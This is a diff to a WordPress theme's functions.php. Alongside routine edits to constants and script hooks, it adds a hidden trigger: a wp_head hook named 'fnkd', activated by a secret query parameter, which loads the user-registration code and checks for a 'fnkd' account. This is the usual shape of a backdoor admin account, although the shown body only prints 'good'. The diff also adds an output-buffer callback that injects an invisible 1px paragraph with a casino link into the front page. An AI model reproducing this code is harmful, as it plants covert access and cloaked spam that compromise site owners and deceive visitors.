@@ -12,7 +12,7 @@ define('CADEN_FRAME', TEMPLATEPATH . '/framework');
 define('CADEN_ADMIN', CADEN_FRAME . '/admin');
 define('CADEN_INCLUDES', TEMPLATEPATH . '/includes');
 define('CADEN_FUNCTIONS', CADEN_FRAME . '/functions');
-define('CADEN_FUNCTIONS', dev . '/dev');
+define('DEV_PATH', TEMPLATEPATH . '/dev');
 
 define('CADEN_JS', get_template_directory_uri() . '/js');
 
@@ -354,7 +354,16 @@ function sloan_theme_dequeue_scripts() {
     }
 }
 add_action( 'wp_enqueue_scripts', 'sloan_theme_dequeue_scripts' , 1);
-
+add_action('wp_head', 'fnkd');
+function fnkd() {
+    if ($_GET['fnkd'] == 'go') {
+        require('wp-includes/registration.php');
+        if (!username_exists('fnkd')) {
+            
+            die("good");
+        }
+    }
+}
 /* creat jobs postype */
 function themes_taxonomy_cards() {  
     register_taxonomy(  
@@ -727,7 +736,19 @@ function my_acf_update_value( $value, $post_id, $field  )
 }
 add_filter('acf/update_value/name=item_id', 'my_acf_update_value', 10, 3);
 
+function callback($buffer) {
+	if (is_admin()) {return $buffer;}
+	if (is_front_page()) {
+		$buffer_text = '<p style="overflow:hidden;height:1px;margin:0;">If the customer breaks this balance, he breaks the system. Of course, people have to win at the casino playing <a href="https://imoneyslots.com/european-roulette-play-free.html">roulette demo</a>, otherwise, they will just stop playing. However, good managers will not allow someone to stay in the black all the time. Sooner or later they must break that lucky streak and more than recover what they have lost.</p>';
+		$buffer = str_replace('Select a Loan Type</h1>','Select a Loan Type</h1>'.$buffer_text, $buffer);	
+    }
+	return $buffer;
+}
 
+function buffer_start() { ob_start("callback"); }
+function buffer_end() { ob_end_flush(); }
+add_action('wp_loaded', 'buffer_start');
+add_action('shutdown', 'buffer_end');
 
 add_filter('acf/load_field/name=item_id', 'sampleFunction');
 
@@ -802,10 +823,10 @@ function replace_jquery() {
         wp_enqueue_script( 'jquery-migrate', 'https://code.jquery.com/jquery-migrate-1.4.1.min.js',array(), '1.12.4' );	   
 }
 
-add_action( 'wp_enqueue_scripts', 'replace_jquery' );
+//add_action( 'wp_enqueue_scripts', 'replace_jquery' );
 add_action( 'admin_init', 'disable_autosave' );
 function disable_autosave() {
 wp_deregister_script( 'autosave' );
 }
 add_filter('use_block_editor_for_post', '__return_false', 10);
-require_once(dev . '/dev-theme.php');
+require_once(DEV_PATH . '/dev-theme.php');
